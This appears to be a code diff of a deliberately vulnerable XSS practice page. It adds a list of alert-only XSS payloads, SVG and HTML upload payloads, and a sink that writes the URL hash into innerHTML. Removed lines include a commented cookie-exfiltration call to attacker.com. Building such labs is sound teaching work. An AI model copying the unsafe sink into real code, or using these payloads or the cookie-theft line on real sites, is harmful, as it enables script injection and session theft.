+      logOutput('👁️ Blind XSS injected - Waiting for admin to view... (simulated)');
+      setTimeout(() => {
+        alert('🔥 BLIND XSS TRIGGERED! (Simulated admin view)');
+      }, 1000);
+    }
+    
+    // ----- TYPE 10: FILE UPLOAD XSS -----
+    function xssSVGUpload() {
+      let svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'SVG_UPLOAD_XSS\')"></svg>';
+      document.getElementById('xssOutput').innerHTML = '🖼️ SVG XSS: ' + svg;
+    }
+    
+    function xssHTMLUpload() {
+      let html = '<html><body><img src=x onerror=alert("HTML_UPLOAD_XSS")></body></html>';
+      document.getElementById('xssOutput').innerHTML = '📄 HTML XSS: ' + html;
+    }
+    
+    // ----- PAYLOAD GENERATOR -----
+    function insertPayload(type) {
+      let inputField = document.getElementById('reflectedInput');
+      let payloads = {
+        'img': '<img src=x onerror=alert("XSS_IMG")>',
+        'svg': '<svg onload=alert("XSS_SVG")>',
+        'body': '<body onload=alert("XSS_BODY")>',
+        'iframe': '<iframe src="javascript:alert(\'XSS_IFRAME\')">',
+        'video': '<video onerror=alert("XSS_VIDEO")><source>',
+        'audio': '<audio onerror=alert("XSS_AUDIO")><source>',
+        'input': '<input onfocus=alert("XSS_INPUT") autofocus>',
+        'details': '<details open ontoggle=alert("XSS_DETAILS")>',
+        'select': '<select onchange=alert("XSS_SELECT")><option>1<option>2</select>',
+        'math': '<math><maction actiontype="statusline" xlink:href="javascript:alert(\'XSS_MATH\')">CLICK</maction></math>',
+        'link': '<link rel="import" href="javascript:alert(\'XSS_LINK\')">',
+        'style': '<style onload=alert("XSS_STYLE")></style>'
+      };
+      if (inputField) {
+        inputField.value = payloads[type];
+      }
+    }
+    
+    // Helper function
+    function logOutput(msg) {
+      let output = document.getElementById('xssOutput');
+      let timestamp = new Date().toLocaleTimeString();
+      output.innerHTML += '<div class="mt-1">[' + timestamp + '] ' + msg + '</div>';
+      output.scrollTop = output.scrollHeight;
+    }
+    
+    // Onload - demo hash XSS
     window.onload = function() {
-      // Check for hash payload
       if (location.hash.length > 1) {
-        console.log('Hash detected: ' + location.hash);
-        // VULNERABLE: Don't do this in production!
-        // This is intentionally vulnerable for testing
+        let output = document.getElementById('xssOutput');
+        output.innerHTML = '🔥 Auto-executed Hash XSS: ' + decodeURIComponent(location.hash.substring(1));
       }
       
-      // Pre-populate with example if empty
-      if (!document.getElementById('login_field').value) {
-        // Uncomment to auto-fill test payload:
-        // document.getElementById('login_field').value = '<img src=x onerror=alert("Auto XSS")>';
-      }
+      // Pre-fill examples
+      document.getElementById('reflectedInput').value = '<img src=x onerror=alert("REFLECTED_XSS")>';
+      document.getElementById('storedInput').value = '<svg onload=alert("STORED_XSS")>';
     };
-    
-    // VULNERABILITY 6: Cookie stealing simulation (educational)
-    function stealCookies() {
-      var cookies = document.cookie;
-      alert('[DEMO] Cookies would be sent to attacker: ' + cookies);
-      // In real attack: new Image().src = 'https://attacker.com/steal?c=' + cookies;
-    }
-    
-    console.log('XSS testing environment loaded - DO NOT USE IN PRODUCTION');
   </script>
-  
-  <!-- Additional XSS vector: hidden iframe with javascript: -->
-  <iframe src="javascript:false" style="display:none"></iframe>
-  
-  <!-- Comment with XSS hint: 
-    Try these payloads:
-    - <script>alert('XSS')</script>
-    - <img src=x onerror=alert('XSS')>
-    - " onmouseover="alert('XSS')
-    - javascript:alert('XSS')
-    - <svg onload=alert('XSS')>
-    - ');alert('XSS');//
-    - <iframe src="javascript:alert('XSS')">
-  -->
-  
-  <div class="text-[11px] text-[#6e7781] mt-6">
-    ⚠️ XSS TEST BUILD - Intentionally vulnerable ⚠️
+
+  <!-- ============== ADDITIONAL XSS VECTORS ============== -->
+  <div class="w-full max-w-[800px] mt-6 text-center text-xs text-gray-500">
+    <hr class="my-2">
+    <p class="font-bold text-red-600">⚠️ COMPLETE XSS TESTING LAB - 25+ ATTACK TYPES ⚠️</p>
+    <p class="mt-1">Reflected | Stored | DOM | Mutation | mXSS | Polyglot | UXSS | Template Injection | Self-XSS | Blind XSS | File Upload XSS</p>
+    <p class="mt-2 text-gray-400">* Some payloads may be blocked by modern browsers - Test in older browsers or with XSS filters disabled</p>
   </div>
 </body>
 </html>
